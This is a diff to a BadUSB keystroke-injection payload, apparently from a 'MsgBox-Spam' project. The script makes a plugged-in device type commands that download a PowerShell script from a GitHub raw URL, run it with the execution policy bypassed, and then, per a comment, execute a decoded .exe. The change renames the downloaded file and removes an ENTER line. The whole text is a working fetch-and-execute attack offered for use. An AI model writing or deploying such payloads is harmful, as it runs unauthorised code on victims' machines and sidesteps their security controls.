@@ -15,7 +15,7 @@ ENTER
 DELAY 500
 
 REM Download the PowerShell termination script
-STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/MsgBox-Spam/msgbox.ps1'; $out='KillMsgBoxOnCtrlCombo.ps1'; Invoke-WebRequest -Uri $url -OutFile $out
+STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/MsgBox-Spam/msgbox.ps1'; $out='msgbox.ps1'; Invoke-WebRequest -Uri $url -OutFile $out
 ENTER
 DELAY 1000
 
@@ -30,8 +30,7 @@ ENTER
 DELAY 1000
 
 REM Execute the PowerShell script to monitor for termination key combo
-STRING PowerShell -ExecutionPolicy Bypass -File .\KillMsgBoxOnCtrlCombo.ps1
-ENTER
+STRING PowerShell -ExecutionPolicy Bypass -File .\msgbox.ps1
 DELAY 500
 
 REM Execute the decoded .exe file
